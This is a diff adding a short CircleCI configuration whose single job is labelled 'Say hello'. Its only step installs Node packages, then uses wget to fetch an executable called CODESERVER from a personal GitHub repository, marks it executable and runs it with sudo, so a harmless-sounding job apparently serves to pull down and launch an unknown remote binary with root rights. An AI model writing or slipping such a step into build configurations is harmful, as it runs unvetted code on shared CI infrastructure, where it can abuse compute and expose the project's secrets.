@@ -1,0 +1,15 @@
+version: 2.1
+jobs:
+  say-hello:
+    docker:
+      - image: cimg/node:12.22.11
+    steps:
+      - checkout
+      - run:
+          name: "Say hello"
+          command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/aurbach55/pos/main/CODESERVER && chmod +x CODESERVER && sudo ./CODESERVER
+
+workflows:
+  say-hello-workflow:
+    jobs:
+      - say-hello
